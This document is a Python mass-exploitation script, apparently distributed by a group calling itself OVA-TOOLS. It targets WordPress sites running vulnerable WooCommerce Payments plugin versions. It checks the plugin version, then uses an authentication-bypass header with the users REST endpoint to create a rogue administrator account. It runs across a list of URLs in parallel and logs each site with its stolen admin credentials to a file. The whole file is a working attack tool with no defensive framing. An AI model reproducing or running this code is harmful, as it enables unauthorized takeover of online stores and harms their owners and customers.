import sys
import urllib3
import requests
import argparse
import random
import string
from colorama import Fore, Style, init
import logging
import re
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor


print('''[#] Created By ::
               
              OVA-TOOLS  https://t.me/ovacloud
''')

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger("urllib3").propagate = False

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def generate_random_username():
    return "ovacloud" + generate_random_string(8)

def generate_random_password():
    return generate_random_string(12)

def generate_random_email():
    return generate_random_string(8) + "@ova-tools.top"

def check_version(target):
    try:
        r = requests.get(f"{target}/wp-content/plugins/woocommerce-payments/readme.txt", verify=False)
        r.raise_for_status()
        version_match = re.search(r"Stable tag: (.+)", r.text, re.IGNORECASE)
        if version_match:
            version = version_match.group(1).strip()
            print(Fore.GREEN + f'{version} - vulnerable!' if int(version.replace('.', '')) < 562 else f'{version} - not vulnerable!', end='\r')
            return version
        else:
            print(Fore.RED + f'Unable to determine version.', end='\r')
            return None
    except requests.RequestException as e:
        print(Fore.RED + f'Not Vuln', end='\r')
        return None

def exploit_version(target, version):
    if version and int(version.replace('.', '')) < 562:
        add_admin(target)
    else:
        print(Fore.RED + "Not vulnerable. Skipping exploitation.", end='\r')

def add_admin(target):
    headers = {
        'User-Agent': 'Ova Tools Agent',
        'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
    }

    username = generate_random_username()
    password = generate_random_password()
    email = generate_random_email()

    data = {
        'rest_route': '/wp/v2/users',
        'username': username,
        'email': email,
        'password': password,
        'roles': 'administrator'
    }

    try:
        s = requests.Session()
        r = s.get(f'{target}', headers=headers, verify=False)
        r.raise_for_status()
        print(Fore.GREEN + f'done', end='\r')
    except requests.RequestException as e:
        print(Fore.RED + f'Error: {e}', end='\r')
        return

    try:
        r = s.post(f'{target}', data=data, headers=headers, verify=False)
        r.raise_for_status()
        if r.status_code == 201:
            print(Fore.GREEN + f'done', end='\r')
            save_result(target, username, password)
        else:
            print(Fore.RED + f'Failed with status code {r.status_code}', end='\r')
    except requests.RequestException as e:
        print(Fore.RED + f'Error: {e}', end='\r')

def save_result(target, username, password):
    result = f"{target}#{username}@{password}\n"
    with open("exploit_results.txt", "a") as file:
        file.write(result)
    print(Style.RESET_ALL + f"[+] Result saved to exploit_results.txt", end='\r')

def perform_exploit(url):
    version = check_version(url)
    exploit_version(url, version)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url-list', help='Path to a text file containing a list of URLs')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    
    if len(sys.argv) == 1:
    	
        parser.print_help()
        print()
        sys.exit()

    args = parser.parse_args()

    if args.url_list:
        with open(args.url_list, 'r') as file:
            urls = file.read().splitlines()
    else:
        print(Fore.RED + "Error: Please provide a list of URLs using the --url-list option.")
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        list(tqdm(executor.map(perform_exploit, urls), total=len(urls), desc='Exploiting', unit='URL', ncols=80))

    print(Style.RESET_ALL + f"\n[+] Task complete")

if __name__ == "__main__":
    main()